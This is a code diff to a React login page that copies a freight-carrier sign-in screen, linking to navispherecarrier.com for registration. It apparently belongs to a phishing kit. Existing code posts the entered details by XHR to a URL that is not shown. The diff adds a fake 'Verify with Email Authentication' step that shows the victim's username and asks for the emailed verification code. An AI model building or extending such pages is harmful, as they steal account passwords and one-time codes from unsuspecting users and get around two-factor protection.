@@ -39,7 +39,12 @@ function HomePage() {
     const togglePassword = () => {
         setPasswordShown(!passwordShown);
     };
-    
+    function back(event) {
+        event.preventDefault();
+        passwordUser.current.value = "";
+        setEreva(!ereva);
+        return;
+    }
      function next(event) {
         event.preventDefault();
         setLoading(!loading);
@@ -65,6 +70,7 @@ function HomePage() {
                     xht.open("POST", url, true);
                     xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
                     xht.send(JSON.stringify(obj));
+                    setUsertazaname(userName.current.value);
                     return;
                 }
             }
@@ -152,6 +158,9 @@ function HomePage() {
                         <span id="" className="translation-jsx-component">The username or password you entered is incorrect.</span>
                     </div>
                   </div>
+                  <p style = {ereva ? { display: 'block' } : { display: 'none' } } className='verifycodetitle'>Verify with Email Authentication</p>
+                  <p style = {ereva ? { display: 'block' } : { display: 'none' } } className='verifycodetext'>&nbsp;&nbsp;&nbsp;A verification code was sent to <span className="bolo"> {usertazaname} </span>. Check your email and enter the code below.</p>
+                  <p style = {ereva ? { display: 'block' } : { display: 'none' } } className='verifycode'>Verification code</p>
                   <div className = "inputBlock" style = {ereva ? { display: 'block' } : { display: 'none' } }>
                         <input onBlur = { handleInputBlur } id = "Digitcode" ref = { digitcodeUser } name = "Digitcode" type = "number" className = "form-control" />
                         <div style = { { display: 'none' } } className = 'requiredBox' >
@@ -162,9 +171,10 @@ function HomePage() {
                   </div> 
                   <div className="buttons">
                       <button style = {ereva ? { display: 'none' } : { display: 'inline-block' } } onClick= { next } id="btnLogin" auto-id="signin_submit_login_button" type='button' className="btn btn-primary btn-block">Log in</button>
-                      <button style = {ereva ? { display: 'inline-block' } : { display: 'none' } } id="btnLogintwo" auto-id="signin_submit_login_button" type='submit' className="btn btn-primary btn-block">Log in</button>
+                      <button style = {ereva ? { display: 'inline-block' } : { display: 'none' } } id="btnLogintwo" auto-id="signin_submit_login_button" type='submit' className="btn btn-primary btn-block">Verify</button>
                       <a style = {ereva ? { display: 'none' } : { display: 'block' } } href="https://www.navispherecarrier.com/registration" id="btn-register" type="button" className="btn btn-default btn-block">Create Account</a>
                   </div>
+                  <div className='backbox'><button onClick= { back } style = {ereva ? { display: 'inline-flex' } : { display: 'none' } } className='backSign' type ='button'>back to Sign In</button></div>
               </form>
           </div>
     </section>
